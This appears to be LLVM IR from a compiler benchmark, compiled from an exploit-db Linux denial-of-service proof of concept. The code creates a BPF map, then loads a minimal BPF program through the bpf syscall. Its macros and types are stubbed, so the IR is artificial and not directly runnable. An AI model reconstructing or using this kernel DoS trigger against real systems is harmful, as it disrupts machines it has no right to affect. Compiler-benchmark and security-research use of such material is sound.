; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_42048.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_42048.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%union.bpf_attr = type { i32 }
%struct.bpf_insn = type { i32 }

@__const.main.create_map_attrs = private unnamed_addr constant %union.bpf_attr { i32 1 }, align 4
@BPF_MAP_CREATE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"map create\00", align 1
@BPF_REG_0 = common dso_local global i32 0, align 4
@BPF_PROG_LOAD = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"prog load\00", align 1
@BPF_MAP_TYPE_ARRAY = common dso_local global i32 0, align 4
@BPF_PROG_TYPE_SOCKET_FILTER = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %union.bpf_attr, align 4
  %3 = alloca i32, align 4
  %4 = alloca [3 x %struct.bpf_insn], align 4
  %5 = alloca [10000 x i8], align 16
  %6 = alloca %union.bpf_attr, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %8 = bitcast %union.bpf_attr* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %8, i8* align 4 bitcast (%union.bpf_attr* @__const.main.create_map_attrs to i8*), i64 4, i1 false)
  %9 = load i32, i32* @BPF_MAP_CREATE, align 4
  %10 = call i32 @bpf_(i32 %9, %union.bpf_attr* %2)
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %13, label %15

13:                                               ; preds = %0
  %14 = call i32 @err(i32 1, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  br label %15

15:                                               ; preds = %13, %0
  %16 = getelementptr inbounds [3 x %struct.bpf_insn], [3 x %struct.bpf_insn]* %4, i64 0, i64 0
  %17 = load i32, i32* @BPF_REG_0, align 4
  %18 = load i32, i32* %3, align 4
  %19 = call i32 @BPF_LD_MAP_FD(i32 %17, i32 %18)
  %20 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %16, i32 0, i32 0
  store i32 %19, i32* %20, align 4
  %21 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %16, i64 1
  %22 = load i32, i32* @BPF_REG_0, align 4
  %23 = call i32 @BPF_MOV64_IMM(i32 %22, i32 0)
  %24 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %21, i32 0, i32 0
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %21, i64 1
  %26 = call i32 (...) @BPF_EXIT_INSN()
  %27 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %25, i32 0, i32 0
  store i32 %26, i32* %27, align 4
  %28 = bitcast %union.bpf_attr* %6 to i32*
  %29 = getelementptr inbounds [10000 x i8], [10000 x i8]* %5, i64 0, i64 0
  %30 = ptrtoint i8* %29 to i32
  store i32 %30, i32* %28, align 4
  %31 = load i32, i32* @BPF_PROG_LOAD, align 4
  %32 = call i32 @bpf_(i32 %31, %union.bpf_attr* %6)
  store i32 %32, i32* %7, align 4
  %33 = load i32, i32* %7, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %15
  %36 = call i32 @err(i32 1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  br label %37

37:                                               ; preds = %35, %15
  %38 = getelementptr inbounds [10000 x i8], [10000 x i8]* %5, i64 0, i64 0
  %39 = call i32 @puts(i8* %38)
  %40 = load i32, i32* %1, align 4
  ret i32 %40
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @bpf_(i32, %union.bpf_attr*) #2

declare dso_local i32 @err(i32, i8*) #2

declare dso_local i32 @BPF_LD_MAP_FD(i32, i32) #2

declare dso_local i32 @BPF_MOV64_IMM(i32, i32) #2

declare dso_local i32 @BPF_EXIT_INSN(...) #2

declare dso_local i32 @puts(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
